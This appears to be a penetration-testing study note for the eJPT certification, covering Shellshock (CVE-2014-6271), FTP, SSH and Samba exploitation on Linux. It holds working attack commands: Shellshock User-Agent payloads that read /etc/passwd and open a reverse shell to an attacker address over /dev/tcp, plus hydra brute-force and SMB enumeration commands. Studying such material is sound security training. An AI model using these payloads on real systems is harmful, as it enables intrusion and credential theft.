# 20 Exploiting Linux Vulnerabilities

# Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)

Vulnerability in the **Bash shell** (since V1.3) is caused whereby Bash mistakenly executes trailing commands after a series of characters `() { :; };)` .

Bash is a Unix based OS shell that is part of the GNU project and is the default shell for the most Linux distro.

Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable. 

CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux system after which the output is displayed to the client.

Exploitation
- Locate an input vector or script that allows you to communicate with Bash
- In Apache web server, we can utilize any legitimate CGI scripts accessible on the web server
- Whenever a CGI scrip is executed, the web server will initiate a new process and run the CGI script with Bash.
- This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.

```bash
nmap -sV <ip> —script=http-shellshock —script-args “http-shellshock.uri=/gettime.cgi”
burp suite: proxy: intercept on
burp suite: repeater: User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
burp suite: repeater: send

Gain reverse shell:
nc -nvlp 1234 (listener)
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<MY-IP>/1234 0>&1'

msf6: search shellshock
msf6: exploit(multi/http/apache_mod_cgi_bash_env_exec)
```

# Exploiting FTP

TCP 21

```shell
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.157.195.3 -t 4 ftp

ftp <target> (connect)

ls -la /usr/share/nmap/scripts | grep ftp-* (list nmap ftp scripts)

seachsploit ProFTPD
```

# Exploiting SSH

TCP 22

2 Authentication 
- username:password
- key based

```shell
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t 4 <TARGET> ssh
```

```shell
ssh username@target (connect)
```

# Exploiting SAMBA

TCP 445, on top of NetBIOS 139

**Authentication**
username:password

**Obtain legitimate credentials**
Brute-force

```shell
hydra -l <username> -P </path-to-library> <target> smb
```

**Enumerate SAMBA**
SMBmap: enumerate share drive, list the contents of the share, download files and execute remote commands.

```shell
smbmap -H <target> -u <username> -p <password>
```

**Other tool**
smbclient: download/upload files, retrive directory information 
enum4linux: enumerate

```shell
smbclient -L <target> -U <username> (list shares)
smbclient //<target>/<share> -U <username> (log in the share)
```

```shell
enum4linux -a <target>
enum4linux -a -u <username> -p <password> <target>
```

#eJPT #cybersecurity 